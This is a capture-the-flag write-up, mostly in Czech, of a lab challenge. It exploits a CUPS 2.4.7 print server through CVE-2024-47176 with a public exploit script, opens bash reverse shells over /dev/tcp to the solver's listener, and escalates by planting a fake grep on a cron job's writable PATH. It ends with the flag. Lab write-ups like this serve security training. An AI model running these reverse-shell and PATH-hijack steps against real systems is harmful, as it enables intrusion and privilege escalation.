# Print server (3)

## Zadání

Hi, emergency troubleshooter,

we've received a notification from the national CSIRT that the print server `ipp.powergrid.tcc` may contain a vulnerability. Verify this report and determine whether the vulnerability is present and how severe it is.

Stay grounded!

`NOTE: This challenge will restart every whole hour to ensure proper functionality.`

`NOTE: If you have played this challenge before 2025-10-06 23:08:00 CEST, start from scratch again, please. Some issues have been fixed.`

## Řešení

Nejdříve uděláme port scan počítače ze zadání.

`nmap ipp.powergrid.tcc -sV -sC`

```text
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.4
|_/
|_http-server-header: CUPS/2.4 IPP/2.1
|_http-title: Home - CUPS 2.4.7
| http-robots.txt: 1 disallowed entry
```

Na počítači běží tisková služba, kterou obsluhuje CUPS ve verzi 2.4.7.

Tato verze obsahuje chybu kolem [CVE-2024-47176](https://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained).

Použijeme třeba exploit [evilcups.py](https://github.com/gumerzzzindo/CVE-2024-47176).

Na vlastním PC spustíme poslouchání na portu 4444.

`nc -vlnp 4444`

a spustíme exploit

`python "evilcups.py" 10.200.0.91 ipp.powergrid.tcc "bash -i >& /dev/tcp/10.200.0.91/4444 0>&1"`

```text
IPP Server Listening on ('10.200.0.91', 12345)
Sending udp packet to ipp.powergrid.tcc:631...
Please wait this normally takes 30 seconds...
5 elapsed
target connected, sending payload ...

target connected, sending payload ...
19 elapsed
```

Na WEB stránce serveru <http://ipp.powergrid.tcc:631/printers/> vyhledáme naší tiskárnu podle naší IP adresy (HACKED_10_200_0_91) a vytiskneme zkušební stránku.

Server by se měl připojit na náš port 4444 a měli bychom mít reverse shell.

FLAG není uložený na běžných místech jako jsou proměnné prostředí nebo soubor přístupný aktuálním uživatelem.

Zajímavý je soubor
`/etc/cron.d/statistics-job`

```text
* * * * * cups_admin PATH=/opt/scripts:/usr/bin:/bin /usr/bin/python3 /opt/secure-scripts/statistics.py -n /opt/scripts/print_count.sh > /var/log/cron.log 2>&1`
```

CRON zde volá jako uživatel cups_admin soubor `/opt/secure-scripts/statistics.py` s nastaveným PATH na `/opt/scripts:/usr/bin:/bin`, který není přístupný pod aktuálním uživatelem, ale v dalším parametru je soubor `/opt/scripts/print_count.sh`, což je skript

```sh
#!/bin/bash

log="/var/log/cups/access_log"
output="/tmp/stats.txt"

grep 'POST /printers/.*HTTP/1\.1" 200' "$log" | awk '{ print $4, $7 }' | while read -r datetime path; do
    date=$(echo "$datetime" | cut -d: -f1 | tr -d '[')
    printer=$(echo "$path" | cut -d'/' -f3)
    echo "$date $printer"
done | sort | uniq -c | sort -nr > "$output"$
```

Skript volá některé příkazy jako grep, awk atd a díky tomu, že je nastavený PATH na `/opt/scripts:/usr/bin:/bin` a adresář `/opt/scripts` je zapisovatelný aktuálním uživatelem, tak můžeme podstrčit upravený grep nebo awk, který bude spuštěn CRONem jako uživatel cups_admin.

Na vlastním PC spustíme další poslouchání na portu 4445.

`nc -vlnp 4445`

a vytvoříme náš `grep`

```sh
echo '#!/bin/sh' > /opt/scripts/grep
echo 'nohup bash -c "bash -i >& /dev/tcp/10.200.0.91/4445 0>&1"' >> /opt/scripts/grep
chmod 777 /opt/scripts/grep
```

a počkáme na celou minutu, až se spustí CRON a otevře se nám reverse shell s přihlášeným uživatelem `cups_admin`. Ale ani tento uživatel nemá přístup do žádného souboru, ve kterém by byl FLAG. Zajímavý je ale soubor `/etc/sudoers.d/cups_admin`, který upravuje přístup do některých souborů. Jeho obsah se normálně nedá zobrazit, ale sudo nám může říct, jaká oprávnění navíc máme.

`sudo -l`

```text
Matching Defaults entries for cups_admin on 22d5bf06c331:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cups_admin may run the following commands on 22d5bf06c331:
    (ALL) NOPASSWD: /bin/cat /root/TODO.txt
```

Zobrazíme si FLAG

`sudo cat /root/TODO.txt`

## Flag

`FLAG{HqW1-cHIN-6S8U-w5uQ}`
